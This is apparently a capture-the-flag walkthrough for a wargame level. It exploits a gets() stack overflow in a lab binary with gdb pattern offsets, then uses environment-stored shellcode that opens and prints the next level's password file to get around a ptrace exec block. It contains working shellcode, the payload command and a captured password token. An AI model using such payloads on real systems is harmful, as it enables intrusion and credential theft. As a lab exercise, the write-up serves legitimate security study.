# A called to `gets` is made which is vunerable to stack overflow
gdb> disass main
[...]
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>         ; gets(shellcode)
[...]

# Let's try a pattern to find if we manage to overwrite the eip
gdb> pattern create 256
gdb> r
[New process 2173]
Give me some shellcode, k
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%G

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2173]
gdb> pattern search
Registers contain pattern buffer:
EIP+0 found at offset: 156

# The program block us from executing `exec` system call
gdb> disass main
[...]
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>       ; ptrace(0x3, pid, 0x2c, 0x0)
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931    ; "no exec() for you"
   0x080487fd <+309>:	call   0x8048500 <puts@plt>         ; puts("no exec() for you")
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>         ; kill(pid, 0x9)
[...]

# So we need to write a shellcode that open and read the password file
# We export our shellcode
$> export SHELLCODE=$(python -c "print '\x90' * 32 + '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'")
gdb> x/s *((char**)environ)
0xffffd8de:	 "SHELLCODE=[...]"
# Our shellcode is at address 0xffffd8de + 10 == 0xffffd8e8

# We prepare our payload, we just need to jump in our nopsled
$> python -c "print 'A' * 156 + '\xeb\xd8\xff\xff'" | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
child is exiting...
